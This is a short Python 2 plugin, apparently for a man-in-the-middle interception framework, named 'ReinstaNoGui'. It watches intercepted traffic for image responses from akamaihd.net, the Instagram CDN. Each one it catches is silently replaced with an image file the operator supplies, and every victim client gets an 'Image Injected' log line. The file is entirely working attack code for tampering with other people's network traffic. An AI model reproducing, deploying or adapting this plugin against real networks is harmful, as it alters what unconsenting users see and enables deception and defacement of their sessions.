
from plugins.plugin import Plugin
import os
from sys import exit


class Replace(Plugin):
    name       = "ReinstaNoGui"
    optname    = "reinstanogui"
    desc       = "Instagram image replace"
    version    = "0.5.4"
    tree_info = ["Replace all images in instagram app"]




    def initialize(self, options):
        self.options = options
        self.imagefile = options.img

        if (os.path.isfile(self.imagefile) is False):
                print "Cant find: " + self.imagefile
                exit()



    def responseheaders(self, response, request):
        if ('akamaihd.net' in response.uri):
                if request.isImageRequest:
                    request.isImageRequest = False
                    request.isImage = True



    def response(self, response, request, data):
        try:
            isImage = getattr(request, 'isImage')
        except AttributeError:
            isImage = False

        if isImage:
            try:
                file = open(self.imagefile, 'r')
                data = file.read()
                self.clientlog.info("Image Injected", extra=request.clientInfo)
            except Exception as e:
                self.clientlog.info("Error: {}".format(e), extra=request.clientInfo)

        return {'response': response, 'request': request, 'data': data}




    def options(self, options):
        options.add_argument('-img', type=str, help="image file")

